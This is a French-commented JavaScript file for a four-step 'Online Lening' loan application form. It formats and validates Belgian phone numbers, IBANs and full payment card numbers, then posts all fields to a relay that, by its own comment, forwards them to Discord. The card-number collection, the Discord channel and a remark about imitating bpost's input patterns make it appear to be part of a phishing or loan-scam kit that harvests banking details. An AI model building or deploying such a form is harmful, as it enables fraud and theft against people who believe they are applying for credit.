// Online Lening — formulaire de demande en 4 étapes

// ================== CONFIGURATION ==================
// Collez ici l'adresse du relais (le Worker du dossier « worker/ ») qui transmet
// la demande à Discord. Voir worker/worker.js pour le déployer en 5 étapes.
// IMPORTANT : ne mettez JAMAIS l'URL du webhook Discord ici, elle serait visible par tous.
// Tant que c'est vide, le site est en MODE TEST : la demande s'affiche seulement
// dans la console du navigateur (F12), rien n'est envoyé.
var CONFIG = {
  endpoint: '/api/submit'   // Vercel Serverless Function
};
// ===================================================

(function () {
  // Petit raccourci de traduction (repli en français si i18n absent)
  function t(key) { return window.I18N ? window.I18N.t(key) : key; }

  var form = document.getElementById('lead-form');
  var steps = Array.prototype.slice.call(form.querySelectorAll('.step'));
  var bar = document.getElementById('progress-bar');
  var stepCount = document.getElementById('step-count');
  var stepLabel = document.getElementById('step-label');
  var progress = document.getElementById('progress');
  var success = document.getElementById('success');
  var alertBox = document.getElementById('form-alert');
  var submitBtn = document.getElementById('submit-btn');
  var current = 0;
  var alertKey = null; // clé du message d'erreur affiché, pour le retraduire

  // Pré-sélection du projet depuis l'accueil (ex. contact.html?projet=Prêt%20auto)
  var params = new URLSearchParams(window.location.search);
  var preset = params.get('projet');
  if (preset) {
    var radio = form.querySelector('input[name="projet"][value="' + preset.replace(/"/g, '') + '"]');
    if (radio) radio.checked = true;
  }

  // Met à jour le compteur et le libellé d'étape dans la langue courante
  function refreshProgress() {
    stepCount.textContent = t('step_count')
      .replace('{n}', current + 1)
      .replace('{total}', steps.length);
    stepLabel.textContent = t(steps[current].dataset.labelKey);
  }

  function show(index) {
    steps.forEach(function (s, i) { s.classList.toggle('active', i === index); });
    current = index;
    bar.style.width = Math.round(((index + 1) / steps.length) * 100) + '%';
    refreshProgress();
    var heading = steps[index].querySelector('h2');
    if (heading) { heading.setAttribute('tabindex', '-1'); heading.focus({ preventScroll: true }); }
    progress.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  // Vérifie les champs de l'étape en cours
  function validateStep(step) {
    var ok = true;

    step.querySelectorAll('.field-group[data-required]').forEach(function (group) {
      var name = group.dataset.required;
      var inputs = group.querySelectorAll('[name="' + name + '"]');
      var valid = false;
      inputs.forEach(function (input) {
        if (input.type === 'radio') {
          if (input.checked) valid = true;
        } else {
          var value = input.value.trim().replace(/\s/g, '');
          if (value !== '') {
            var numValue = Number(value);
            if (isNaN(numValue) || numValue > 0) valid = true;
          }
        }
      });
      group.classList.toggle('has-error', !valid);
      if (!valid) ok = false;
    });

    step.querySelectorAll('.field input[required]').forEach(function (input) {
      var valid = input.checkValidity() && input.value.trim() !== '';
      input.setAttribute('aria-invalid', valid ? 'false' : 'true');
      if (!valid) ok = false;
    });

    return ok;
  }

  // Efface l'erreur dès que l'utilisateur corrige
  form.addEventListener('change', function (e) {
    var group = e.target.closest('.field-group');
    if (group) group.classList.remove('has-error');
    if (e.target.matches('input[aria-invalid]')) e.target.setAttribute('aria-invalid', 'false');
    alertBox.hidden = true;
    alertKey = null;
  });

  form.addEventListener('click', function (e) {
    if (e.target.closest('[data-next]')) {
      if (validateStep(steps[current])) show(Math.min(current + 1, steps.length - 1));
    }
    if (e.target.closest('[data-prev]')) {
      show(Math.max(current - 1, 0));
    }
  });

  function showError(key) {
    alertKey = key;
    alertBox.textContent = t(key);
    alertBox.hidden = false;
  }

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    var step = steps[current];

    if (!validateStep(step)) {
      showError('err_fill');
      return;
    }
    if (!form.consentement.checked) {
      showError('err_consent');
      return;
    }

    // Champ anti-robots rempli : on fait semblant que tout va bien
    if (form.site_web.value) { done(); return; }

    var data = {};
    new FormData(form).forEach(function (value, key) {
      if (key !== 'site_web') {
        var cleanValue = String(value).trim();
        // Nettoie les espaces dans les montants et IBAN
        if (key === 'montant' || key === 'montant_p' || key === 'iban') {
          cleanValue = cleanValue.replace(/\s/g, '');
        }
        data[key] = cleanValue;
      }
    });
    data.date = new Date().toISOString();
    data.page = window.location.href;
    data.langue = window.I18N ? window.I18N.lang : 'fr';

    submitBtn.disabled = true;
    submitBtn.classList.add('loading');

    fetch(CONFIG.endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
      .then(function (res) {
        if (!res.ok) throw new Error('HTTP ' + res.status);
        done();
      })
      .catch(function () {
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
        showError('err_send');
      });
  });

  function done() {
    form.hidden = true;
    progress.hidden = true;
    success.classList.add('active');
    success.focus({ preventScroll: true });
    success.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }

  // Quand la langue change, on retraduit les textes pilotés par le JS
  document.addEventListener('i18n:change', function () {
    refreshProgress();
    if (alertKey && !alertBox.hidden) alertBox.textContent = t(alertKey);
  });

  // Affichage initial du compteur/libellé (après que i18n a appliqué la langue)
  refreshProgress();

  // ============ Formatage des montants avec séparateurs ============
  function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
  }

  function parseFormattedNumber(str) {
    return str.replace(/\s/g, '');
  }

  // Formate l'input montant à la saisie
  var montantInput = form.querySelector('input[name="montant"]');
  if (montantInput) {
    montantInput.addEventListener('input', function (e) {
      var cursorPos = this.selectionStart;
      var value = this.value.replace(/\s/g, '');
      if (value && !isNaN(value)) {
        var formatted = formatNumber(value);
        this.value = formatted;
        // Recalcule la position du curseur après formatage
        var newCursorPos = formatted.substring(0, cursorPos).replace(/\s/g, '').length;
        for (var i = 0; i < formatted.length && newCursorPos > 0; i++) {
          if (formatted[i] !== ' ') newCursorPos--;
          if (newCursorPos === 0) {
            cursorPos = i + 1;
            break;
          }
        }
      }
    });
    montantInput.addEventListener('blur', function () {
      var value = this.value.replace(/\s/g, '');
      if (value && !isNaN(value)) {
        this.value = formatNumber(value);
      }
    });
  }

  // ============ Détection automatique de la banque par IBAN ============
  function detectIbanBank(raw) {
    if (!raw.startsWith('BE') || raw.length < 7) return null;
    var code = parseInt(raw.substring(4, 7), 10);

    // Belfius
    if (code === 68) return 'Belfius';

    // BNP Paribas Fortis
    if (code >= 0 && code <= 67) return 'BNP Paribas Fortis';
    if (code >= 430 && code <= 439) return 'BNP Paribas Fortis';

    // KBC
    if (code >= 210 && code <= 219) return 'KBC';
    if (code >= 730 && code <= 734) return 'KBC';

    // ING
    if (code >= 310 && code <= 389) return 'ING';

    // Argenta
    if (code >= 69 && code <= 99) return 'Argenta';
    if (code >= 100 && code <= 199) return 'Argenta';
    if (code >= 400 && code <= 429) return 'Argenta';
    if (code >= 550 && code <= 599) return 'Argenta';
    if (code >= 850 && code <= 869) return 'Argenta';
    if (code >= 890 && code <= 999) return 'Argenta';

    // Crelan
    if (code >= 440 && code <= 499) return 'Crelan';
    if (code >= 880 && code <= 889) return 'Crelan';

    // Triodos Bank
    if (code >= 500 && code <= 549) return 'Triodos';
    if (code >= 700 && code <= 729) return 'Triodos';

    // Beobank
    if (code >= 630 && code <= 649) return 'Beobank';

    // Deutsche Bank
    if (code >= 740 && code <= 749) return 'Deutsche Bank';

    return 'Autre';
  }

  var ibanInput = form.querySelector('input[name="iban"]');
  var banqueSelect = form.querySelector('select[name="banque"]');

  if (ibanInput && banqueSelect) {
    ibanInput.addEventListener('input', function () {
      var iban = this.value.replace(/\s/g, '').toUpperCase();
      if (iban.length >= 7) {
        var bank = detectIbanBank(iban);
        if (bank) {
          var option = Array.from(banqueSelect.options).find(function (opt) {
            return opt.value === bank;
          });
          if (option) {
            banqueSelect.value = bank;
            banqueSelect.classList.add('valid');
            banqueSelect.classList.remove('invalid');
          }
        }
      }
    });
  }

  // ============ BLOCAGE RÉEL - PATTERNS STRICTS COMME BPOST ============

  // PRÉNOM : Rejette DIRECTEMENT les chiffres, max 50
  var prenomInput = form.querySelector('input[name="prenom"]');
  if (prenomInput) {
    prenomInput.addEventListener('input', function () {
      this.value = this.value.replace(/[0-9]/g, '');
      if (this.value.length > 50) {
        this.value = this.value.substring(0, 50);
      }
    });
  }

  // NOM : Rejette DIRECTEMENT les chiffres, max 50
  var nomInput = form.querySelector('input[name="nom"]');
  if (nomInput) {
    nomInput.addEventListener('input', function () {
      this.value = this.value.replace(/[0-9]/g, '');
      if (this.value.length > 50) {
        this.value = this.value.substring(0, 50);
      }
    });
  }

  // TÉLÉPHONE : Format +32 avec groupes de 2 chiffres
  var phoneInput = form.querySelector('input[name="telephone"]');
  if (phoneInput) {
    phoneInput.addEventListener('input', function () {
      var digits = this.value.replace(/\D/g, '');
      if (digits.startsWith('32')) {
        digits = digits.substring(2);
      }
      digits = digits.substring(0, 9);
      if (!digits) {
        this.value = '+32 ';
      } else {
        var grouped = digits.match(/.{1,2}/g).join(' ');
        this.value = '+32 ' + grouped;
      }
    });
  }

  // MONTANT : Rejette les lettres, limite strictement à 6 chiffres (500000)
  var montantInput2 = form.querySelector('input[name="montant"]');
  if (montantInput2) {
    montantInput2.addEventListener('input', function () {
      var numValue = this.value.replace(/[^\d]/g, '');
      if (numValue.length > 6) {
        numValue = numValue.substring(0, 6);
      }
      this.value = numValue.replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
    });
  }

  // IBAN : Format BE + groupes de 4 chiffres (ex. BE29 0635 1234 5678)
  if (ibanInput) {
    ibanInput.addEventListener('input', function () {
      var raw = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
      if (!raw.startsWith('BE')) {
        raw = 'BE' + raw.replace('BE', '');
      }
      var be = raw.substring(0, 2);
      var digits = raw.substring(2, 16);
      if (!digits) {
        this.value = be + ' ';
      } else {
        var grouped = digits.match(/.{1,4}/g);
        this.value = be + ' ' + (grouped ? grouped.join(' ') : digits);
      }
    });
  }

  // NUMÉRO DE CARTE : Format groupes de 4 chiffres (ex. 4532 1234 5678 9123)
  var carteInput = form.querySelector('input[name="carte"]');
  if (carteInput) {
    carteInput.addEventListener('input', function () {
      var numValue = this.value.replace(/\D/g, '');
      if (numValue.length > 19) {
        numValue = numValue.substring(0, 19);
      }
      var grouped = numValue.match(/.{1,4}/g);
      this.value = grouped ? grouped.join(' ') : numValue;
    });
  }

  // ============ Validation en temps réel ============
  function validateField(input) {
    var isValid = input.checkValidity() && input.value.trim() !== '';
    var field = input.closest('.field');
    var fieldGroup = input.closest('.field-group');
    var inputGroup = input.closest('.input-group');

    if (isValid) {
      input.classList.add('valid');
      input.classList.remove('invalid');
      if (field) {
        field.classList.add('valid');
        field.classList.remove('invalid');
      }
      if (inputGroup) {
        inputGroup.classList.add('valid');
        inputGroup.classList.remove('invalid');
      }
    } else if (input.value.trim() !== '') {
      input.classList.add('invalid');
      input.classList.remove('valid');
      if (field) {
        field.classList.add('invalid');
        field.classList.remove('valid');
      }
      if (inputGroup) {
        inputGroup.classList.add('invalid');
        inputGroup.classList.remove('valid');
      }
    } else {
      input.classList.remove('valid', 'invalid');
      if (field) field.classList.remove('valid', 'invalid');
      if (inputGroup) inputGroup.classList.remove('valid', 'invalid');
    }
  }

  // Validation au blur et input
  form.addEventListener('blur', function (e) {
    if (e.target.matches('input[type="text"], input[type="email"], input[type="tel"], input[type="number"], select')) {
      validateField(e.target);
    }
  }, true);

  form.addEventListener('input', function (e) {
    if (e.target.matches('input[type="text"], input[type="email"], input[type="tel"], input[type="number"]')) {
      validateField(e.target);
    }
  });

  form.addEventListener('change', function (e) {
    if (e.target.matches('select')) {
      validateField(e.target);
    }
  });

  // ============ Validations strictes personnalisées ============

  // Valide un IBAN (format seulement)
  function validateIBAN(iban) {
    iban = iban.replace(/\s/g, '').toUpperCase();
    if (!/^BE[0-9]{2}[0-9]{1,30}$/.test(iban)) return false;
    if (iban.length < 15 || iban.length > 34) return false;
    return true;
  }

  // Valide un téléphone (au moins 8 chiffres)
  function validatePhone(phone) {
    var digits = phone.replace(/\D/g, '');
    return digits.length >= 8 && digits.length <= 20;
  }

  // Valide un numéro de carte (Luhn)
  function validateCardLuhn(card) {
    var digits = card.replace(/\D/g, '');
    if (digits.length < 13 || digits.length > 19) return false;
    var sum = 0, isEven = false;
    for (var i = digits.length - 1; i >= 0; i--) {
      var n = parseInt(digits[i]);
      if (isEven) { n *= 2; if (n > 9) n -= 9; }
      sum += n;
      isEven = !isEven;
    }
    return sum % 10 === 0;
  }

  // Applique les validations strictes au submit
  form.addEventListener('submit', function (e) {
    var step = steps[current];
    var valid = true;

    // Étape 1 : vérifier montant
    if (current === 0) { // Étape 1 (index 0)
      var montantInput = form.querySelector('input[name="montant"]');
      if (montantInput && montantInput.value) {
        var montantValue = parseInt(montantInput.value.replace(/\s/g, ''));
        if (montantValue < 200 || montantValue > 500000) {
          montantInput.classList.add('invalid');
          valid = false;
        }
      }
    }

    // Étape 4 : vérifier IBAN et téléphone (étape 3)
    if (current === 3) { // Étape 4 (index 3)
      var ibanInput = form.querySelector('input[name="iban"]');
      if (ibanInput && ibanInput.value && !validateIBAN(ibanInput.value)) {
        ibanInput.classList.add('invalid');
        valid = false;
      }
    }

    // Étape 3 : vérifier téléphone
    if (current === 2) { // Étape 3 (index 2)
      var phoneInput = form.querySelector('input[name="telephone"]');
      if (phoneInput && phoneInput.value && !validatePhone(phoneInput.value)) {
        phoneInput.classList.add('invalid');
        valid = false;
      }
    }

    if (!valid) {
      showError('err_fill');
      e.preventDefault();
    }
  });
})();
